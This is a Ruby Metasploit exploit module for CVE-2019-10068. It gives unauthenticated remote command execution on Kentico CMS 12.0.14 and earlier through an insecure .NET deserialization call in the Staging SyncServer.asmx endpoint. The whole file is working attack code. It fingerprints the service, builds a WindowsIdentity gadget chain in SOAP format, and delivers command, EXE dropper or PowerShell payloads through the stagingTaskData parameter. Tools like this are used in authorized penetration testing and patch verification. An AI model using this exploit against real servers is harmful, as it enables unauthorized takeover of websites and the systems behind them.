##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kentico CMS Staging SyncServer Unserialize Remote Command Execution',
        'Description' => %q{
          This module exploits a vulnerability in the Kentico CMS platform versions 12.0.14 and earlier.
          Remote Command Execution is possible via unauthenticated XML requests to the Staging Service
          SyncServer.asmx interface ProcessSynchronizationTaskData method stagingTaskData parameter. XML
          input is passed to an insecure .NET deserialize call which allows for remote command execution.
        },
        'DisclosureDate' => '2019-04-15',
        'Author' => [
          'Manoj Cherukuri', # Discovery
          'Justin LeMay',     # Discovery
          'aushack',          # msf exploit
        ],
        'References' => [
          ['CVE', '2019-10068'],
          ['URL', 'https://www.aon.com/cyber-solutions/aon_cyber_labs/unauthenticated-remote-code-execution-in-kentico-cms/']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Payload' => { 'DisableNops' => true },
        'Targets' => [
          [
            'Windows EXE Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_dropper
            }
          ],
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :windows_command,
              'Space' => 3000
            }
          ],
          [
            'Windows Powershell',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_powershell
            }
          ]
        ],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'Path to SyncServer.asmx', '/CMSPages/Staging/SyncServer.asmx']),
      Opt::RPORT(80)
    ])
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    })

    if res && res.body =~ /SyncServer Web Service/i # SOAP endpoint disco / WSDL
      return CheckCode::Detected
    end

    return CheckCode::Safe
  end

  def exploit
    case target['Type']
    when :windows_command
      execute_command(payload.encoded)
    when :windows_dropper
      cmd_target = targets.select { |target| target['Type'] == :windows_command }.first
      execute_cmdstager({ linemax: cmd_target.opts['Space'] })
    when :windows_powershell
      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))
    end
  end

  def execute_command(cmd, _opts = {})
    sploit = ::Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :WindowsIdentity,
      formatter: :SoapFormatter
    )

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/ProcessSynchronizationTaskData'),
      'method' => 'POST',
      'vars_post' => { 'stagingTaskData' => sploit }
    })

    unless res && res.body.include?('Unable to cast object of type')
      fail_with(Failure::UnexpectedReply, 'The payload was rejected')
    end
  end
end
